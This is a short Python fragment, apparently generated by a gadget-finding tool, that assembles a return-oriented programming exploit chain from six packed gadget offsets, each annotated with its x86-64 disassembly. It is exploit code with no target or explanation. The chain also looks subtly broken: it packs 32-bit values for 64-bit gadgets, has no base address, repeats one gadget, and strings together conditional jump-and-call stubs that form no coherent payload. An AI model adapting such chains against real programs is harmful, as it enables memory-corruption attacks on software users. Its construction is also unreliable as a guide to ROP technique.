p = ""
p += struct.pack("<I", 0x811)  # mov eax, 0; pop rbp; ret; 
p += struct.pack("<I", 0x850)  # mov eax, dword ptr [rip + 0x2007a2]; mov rdi, rax; call 0x6b0; nop; leave; ret; 
p += struct.pack("<I", 0x789)  # mov eax, dword ptr [rip + 0x200861]; test rax, rax; je 0x7a0; pop rbp; jmp rax; 
p += struct.pack("<I", 0x738)  # mov eax, dword ptr [rip + 0x20089a]; test rax, rax; je 0x750; pop rbp; jmp rax; 
p += struct.pack("<I", 0x68d)  # mov eax, dword ptr [rip + 0x200955]; test rax, rax; je 0x69a; call rax; 
p += struct.pack("<I", 0x68d)  # mov eax, dword ptr [rip + 0x200955]; test rax, rax; je 0x69a; call rax; add rsp, 8; ret; 
